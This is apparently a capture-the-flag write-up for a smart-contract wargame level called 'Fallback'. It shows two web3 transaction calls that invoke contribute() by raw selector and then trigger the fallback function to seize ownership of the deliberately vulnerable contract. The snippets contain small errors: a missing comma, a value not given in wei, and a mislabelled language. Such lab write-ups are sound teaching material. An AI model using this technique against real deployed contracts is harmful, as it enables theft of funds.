# Fallback

In this contract. The vulnerability can be exploited by calling the function contribute() outside the ABI, so that you 
provide an amount lower than 0.001 ether. Then, we take advantage of the Fallback function to take the ownership of 
the contract.

This is done by calling:

```solidity
web3.eth.sendTransaction({
    to: contract.address,
    from: player 
    value: 0.0005,
    data: "0xd7bb99ba"
})
```

0xd7bb99ba Stands for the first four bytes of the hash of "contribute()"
That's how you indicate the function you are calling.


After doing this, we just send a small amount of ether to the contract with no data, or with 
the hash that does not match any function. Like this:

```solidity
web3.eth.sendTransaction({
    to: contract.address,
    from: player 
    value: 0.0005,
    data: "0x00000000"
})
```
